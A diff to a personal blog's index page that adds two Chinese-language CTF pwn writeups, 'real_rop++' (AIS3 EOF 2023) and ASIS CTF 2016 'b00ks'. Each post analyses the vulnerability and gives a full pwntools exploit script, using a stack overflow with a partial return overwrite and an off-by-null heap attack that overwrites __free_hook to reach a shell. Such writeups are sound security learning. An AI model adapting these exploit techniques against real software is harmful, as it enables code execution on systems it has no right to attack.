@@ -322,6 +322,170 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/20/AIS3-EOF-2023-Quals/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Terry1234">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Terry1234 的廢文區">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/20/AIS3-EOF-2023-Quals/" class="post-title-link" itemprop="url">AIS3 EOF 2023 Quals Writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-20 11:14:38" itemprop="dateCreated datePublished" datetime="2023-03-20T11:14:38+08:00">2023-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-29 15:33:24" itemprop="dateModified" datetime="2023-08-29T15:33:24+08:00">2023-08-29</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>這次跟朋友組隊打AIS3 EOF，結果被打爆了</p>
+<h2 id="成績"><a href="#成績" class="headerlink" title="成績"></a>成績</h2><p>隊伍:第40名(共92隊)<br><img src="https://i.imgur.com/PBvRc2U.png"></p>
+<p>個人:只解掉一題pwn<br><img src="https://i.imgur.com/ZGA6d7m.png"><br><img src="https://i.imgur.com/TZTK6Fb.png"></p>
+<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="real-rop-445-points"><a href="#real-rop-445-points" class="headerlink" title="real_rop++ (445 points)"></a>real_rop++ (445 points)</h3><h4 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 20.04</span><br><span class="line">glibc 2.31</span><br></pre></td></tr></table></figure>
+<h4 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[0x10];</span><br><span class="line"></span><br><span class="line">    read(0, buf, 0x30);</span><br><span class="line">    write(1, buf, 0x30);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明顯的棧溢出，測試後發現return address距離buf 0x18 bytes</p>
+<h4 id="防護機制"><a href="#防護機制" class="headerlink" title="防護機制"></a>防護機制</h4><p><img src="https://i.imgur.com/YnW7OPE.png"></p>
+<h4 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h4><p>它有write，可以用這點來leak address，這樣我們如果能回到main，就有機會攻擊，但它開了PIE，所以要用partial write的方式來打。</p>
+<p>在main結束後會return到&lt;libc_start_main+243&gt;的地方，但libc_start_main也會在程式開始、還沒進到main之前被呼叫，之後就會呼叫一些函數，然後進到main</p>
+<p>所以我們可以把return address蓋成libc_start_main上的某個地方，讓他再次回到main，由於他在read完後會write，我們可以利用這點leak出libc的base address<br>這樣再次回到main之後就有one gadget可以利用</p>
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>那個b’\x10’是我<del>通靈</del>測試出來的，然後return address最右邊的那三位原本是0x83，但被我們蓋成0x10，所以在算libc base address的時候要調一下<br>然後one_gadget有l2這個選項，可以找出更多gadget<br>後續在測試的時候發現在local端無法拿到shell，但remote端可以。應該是one_gadget的條件問題，但我試了所有的one_gadget都不行，神奇<br>但我不打算繼續測了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Host = <span class="string">&#x27;edu-ctf.zoolab.org&#x27;</span></span><br><span class="line">Port = <span class="number">10014</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(Host, Port)</span><br><span class="line"><span class="comment">#r = process(&#x27;./chal&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x10</span> + <span class="number">0x8</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span> * offset + <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(r.recv(<span class="number">0x30</span>)[<span class="number">0x18</span>:<span class="number">0x20</span>]) + <span class="number">0x83</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = libc_start_main - <span class="number">0x24083</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x84143</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">FLAG&#123;pancake_fc5930a6007fef9b7d998f205417e671&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/jpeaHHP.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/07/ASIS-CTF-2016-b00ks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Terry1234">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Terry1234 的廢文區">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/07/ASIS-CTF-2016-b00ks/" class="post-title-link" itemprop="url">ASIS CTF 2016 b00ks</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-07 02:16:53" itemprop="dateCreated datePublished" datetime="2023-02-07T02:16:53+08:00">2023-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-29 15:33:23" itemprop="dateModified" datetime="2023-08-29T15:33:23+08:00">2023-08-29</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04</span><br><span class="line">glibc 2.23</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>一個書籍管理系統，具有新增、刪除、更改作者名等功能<br><img src="https://i.imgur.com/Eb4AiKR.png"></p>
+<h3 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h3><p><img src="https://i.imgur.com/pVYhbMa.png"></p>
+<h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><h4 id="book-struct"><a href="#book-struct" class="headerlink" title="book struct"></a>book struct</h4><p>此系統用以下的struct保存書籍資訊，並使用一個陣列books儲存每個book中的book_name pointer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *book_name;</span><br><span class="line">    <span class="type">char</span> *book_description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="input-function"><a href="#input-function" class="headerlink" title="input function"></a>input function</h4><p>題目使用一個自己實作的輸入函數，會在輸入字串的結尾補上一個null byte</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">input</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="author-name"><a href="#author-name" class="headerlink" title="author name"></a>author name</h4><p>此系統使用一個長度為0x20的陣列author儲存當前的作者名稱，可以發現author[]後面就是books[]</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">set_author_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)input(author, <span class="number">32</span>) )       <span class="comment">// off by null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/aTAQBl2.png"></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="觀察"><a href="#觀察" class="headerlink" title="觀察"></a>觀察</h3><ol>
+<li>輸入作者時存在off by null，可以先輸入一個長度為0x20的作者名稱，再新增書籍。這樣null byte就會被books[0]最低位覆蓋。透過顯示書籍的功能即可洩漏heap address</li>
+<li>再次輸入長度為0x20的作者名稱，即可覆蓋books[0]，使第1個book落在低一點的記憶體位置上</li>
+</ol>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
+<li>我們可以新增一個大一點的book1，這樣就有機會使book1在被null byte覆蓋後落在原本book1的description，同時新增一個description size屬於unsorted bin範圍的book2並刪除它，方便後續的利用。我們可以使用edit功能在那裡偽造一個fake book來達到任意位址讀寫</li>
+<li>將fake book的description指向book2的description chunk的fd，再透過顯示書籍的功能即可洩漏libc位置</li>
+</ol>
+<h3 id="exploit-script"><a href="#exploit-script" class="headerlink" title="exploit script"></a>exploit script</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_author_name</span>(<span class="params">author</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">	p.sendline(author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, description_size, description</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(description_size))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, description</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">author</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	send_author_name(author)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use off by null to leak heap address</span></span><br><span class="line">send_author_name(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="number">0x100</span>, <span class="string">b&#x27;b&#x27;</span>) <span class="comment"># bool 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># book 2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Author: &#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0x20</span>:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a fake book in book1 (the offset is found by debugging)</span></span><br><span class="line"><span class="comment"># let the description pointer of fake book points to book 2 fd, leak libc address</span></span><br><span class="line"><span class="comment"># set the size of description bigger (I set it to 0x10000), for further exploitation</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="number">0x40</span>) + p64(<span class="number">0x1</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x8</span> + p64(heap_addr + <span class="number">0x50</span>) + p64(<span class="number">0x10000</span>))</span><br><span class="line">change_author_name(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">main_arena = u64(p.recvline()[:-<span class="number">1</span>] + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span>, <span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free_hook = libc_base  + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the description pointer of fake book points to the description of book3</span></span><br><span class="line"><span class="comment"># since we set the size of description of fake chunk to 0x10000, we can control the description pointer of book3</span></span><br><span class="line"><span class="comment"># we can arbitrary write now!</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x500</span> + <span class="number">0x8</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x3</span>) + p64(heap_addr + <span class="number">0x30</span>) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload1)</span><br><span class="line">edit(<span class="number">3</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger one gadget</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/41sQN15.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
 
@@ -387,14 +551,14 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
